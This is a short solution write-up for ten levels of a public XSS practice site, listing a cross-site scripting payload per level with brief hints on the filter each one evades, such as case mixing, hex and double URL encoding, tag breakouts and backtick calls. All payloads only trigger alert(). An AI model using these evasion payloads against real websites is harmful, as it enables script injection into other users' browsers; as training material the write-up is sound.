# XSS Challanges from https://www.zixem.altervista.org/XSS

## Level 1

```html
<svg/onload=alert()>
```
## Level 2

- WAF looking for "script"

```html
<object data="javascRipt:alert()">
```

## Level 3

- %0A (LF = linefeed)

```html
%0A<svg/onload=alert()>
```

## Level 4

- Inline html

```html
x' onerror=javascript:alert()//
```

## Level 5

- param reflected in form post field (action)

```html
XSS&action=javascript:alert(1337)
```

## Level 6

- Hex encodin \x

```
\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x29
```

## Level 7

- Double urlencodeing 

```html
%253Csvg%2520onload%253Dalert%2528%2529%253E
```

## Level 8

## Level 9
- Escape the html tag with ```</p>```

```
</p><svg/onload=alert()>
```

## Level 10

- Filters ```(```

```html
');alert`1`;//
');/**/onerror=alert`1`//
```
